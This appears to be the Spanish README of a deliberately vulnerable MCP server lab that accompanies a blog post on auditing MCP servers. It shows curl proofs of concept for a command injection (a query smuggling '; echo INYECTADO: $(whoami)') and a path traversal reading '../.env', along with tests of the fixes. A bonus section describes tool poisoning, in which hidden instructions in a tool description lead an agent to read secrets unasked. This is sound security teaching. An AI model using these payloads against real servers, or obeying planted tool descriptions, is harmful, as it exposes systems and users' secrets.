# vulnerable-notes-mcp

Servidor [MCP](https://modelcontextprotocol.io) deliberadamente vulnerable, para reproducir en vivo dos fallas que se auditan contra el MCP remoto real de un tercero, con `curl` puro:

1. **Command injection** — input sin sanitizar concatenado en un `exec()` de shell.
2. **Path traversal** — un parámetro de ruta que se une al directorio permitido sin validar el resultado.

Acompaña el post [Auditando un servidor MCP: 2 fallas que se repiten en producción](https://rockysec.com/auditando-servidor-mcp/) en rockysec.com. Ahí está la explicación completa de cada una, con archivo y línea vulnerable, el PoC y el fix.

**No usar como base de nada real.** El código en `src/vulnerable*.ts` existe únicamente para practicar la explotación en un entorno controlado.

## Estructura

```
src/lib/vulnerable-tools.ts   las fallas, compartidas por los dos transportes
src/lib/fixed-tools.ts        las correcciones, compartidas por los dos transportes
src/vulnerable-http.ts        entrypoint HTTP (remoto) — issues 1 y 2: injection y traversal
src/fixed-http.ts             entrypoint HTTP (remoto), corregido
src/vulnerable.ts             entrypoint stdio (local), solo para el bonus de tool poisoning
src/fixed.ts                  entrypoint stdio (local), corregido
agent-demo.mjs                agente real (AI SDK + GPT-4o-mini), solo para el bonus
notes/                        datos de ejemplo
.env.example                  secretos de prueba: es el archivo que filtra el path traversal
```

Los dos transportes registran exactamente las mismas tools (`src/lib/`): la elección de stdio vs. HTTP no cambia el bug, cambia solo cómo se lo reproduce.

## Instalación

Requiere Node 20 o superior.

```bash
git clone https://github.com/rockysec/vulnerable-notes-mcp
cd vulnerable-notes-mcp
npm install
cp .env.example .env
```

`.env` contiene credenciales de prueba (`DATABASE_URL`, `API_KEY`) que no sirven para nada real: son el objetivo del path traversal más abajo.

Levantar el server vulnerable en `http://127.0.0.1:3939/mcp`:

```bash
npm run start:http
```

## Issue 1: Command Injection

El handler de `search_notes` concatena el argumento directo en un comando de shell (`src/lib/vulnerable-tools.ts`).

Uso legítimo, para tener un antes:

```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": { "name": "search_notes", "arguments": { "query": "staging" } },
    "id": 1
  }' \
  http://127.0.0.1:3939/mcp
```

Ahora el mismo argumento, con un comando extra inyectado:

```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "search_notes",
      "arguments": { "query": "nada\" ; echo INYECTADO: $(whoami) ; echo \"" }
    },
    "id": 2
  }' \
  http://127.0.0.1:3939/mcp
```

`whoami` corre además del `grep` que se esperaba: la respuesta incluye una línea `INYECTADO: <tu usuario>`.

## Issue 2: Path Traversal

`read_note` concatena el nombre de archivo al directorio permitido con `join`, sin validar el resultado (`src/lib/vulnerable-tools.ts`).

```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": { "name": "read_note", "arguments": { "path": "../.env" } },
    "id": 3
  }' \
  http://127.0.0.1:3939/mcp
```

Una tool pensada para leer notas de texto termina devolviendo el contenido de `.env`.

> Este server no requiere sesión (`Mcp-Session-Id`): sirve clientes 2025-06-18 sin estado. Si el MCP remoto que estés auditando sí la exige, primero mandá un `initialize`, tomá el header `Mcp-Session-Id` de la respuesta, y repetilo en cada request siguiente. La [guía de Glama sobre testing de Streamable HTTP con curl](https://glama.ai/blog/2026-01-02-how-to-test-mcp-streamable-http-endpoints-using-c-url) cubre ese flujo completo.

## Confirmar las correcciones

Detener el server vulnerable (`Ctrl+C`) y levantar el corregido en `http://127.0.0.1:3940/mcp`:

```bash
npm run start:http:fixed
```

Los mismos dos `curl` de arriba, contra el puerto `3940`, deberían responder:

```bash
# Injection: inerte, "Sin resultados", sin ejecutar whoami
curl -s -X POST -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"search_notes","arguments":{"query":"nada\" ; echo INYECTADO: $(whoami) ; echo \""}},"id":2}' \
  http://127.0.0.1:3940/mcp

# Traversal: bloqueado, isError true, "Ruta fuera de notes/"
curl -s -X POST -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"read_note","arguments":{"path":"../.env"}},"id":3}' \
  http://127.0.0.1:3940/mcp
```

## De este laboratorio a un MCP remoto real

Mandar payloads de ataque contra la infraestructura de producción de un tercero **no** es lo mismo que probarlos contra tu propio lab. Solo corresponde hacerlo si el proveedor tiene un programa de bug bounty o disclosure que explícitamente incluya su endpoint MCP en el scope, y dentro de esas reglas.

## Bonus: Tool Poisoning (local, no cubierto en el post)

El repo incluye también una tercera falla, servida por stdio en vez de HTTP porque se detecta por lectura, sin llamar ninguna tool: instrucciones escondidas en la `description` de `search_notes`, que un modelo puede obedecer sin que la persona las vea nunca.

```bash
npx @modelcontextprotocol/inspector --cli npx tsx src/vulnerable.ts --method tools/list
```

La `description` sale completa, incluida la instrucción oculta dentro de un bloque `<IMPORTANT>`. Confirmar el fix contra `src/fixed.ts` con el mismo comando: la descripción corregida es simplemente honesta.

El escenario completo, con un agente real:

```bash
export OPENAI_API_KEY=sk-...
npm run agent-demo
```

Conecta un modelo real al server vulnerable con `@ai-sdk/mcp` y le pide que busque una nota. El script imprime cada `tool_call` que decide hacer el modelo: si obedece la instrucción oculta, va a aparecer una llamada a `read_note` con `../.env` que nadie pidió en el prompt.

A diferencia de los issues 1 y 2, leer `tools/list` de un MCP real es siempre legítimo: es lo mismo que hace tu propio cliente al conectar el servicio, así que esta falla se puede auditar contra cualquier tercero sin pedir permiso.

## Licencia

MIT.
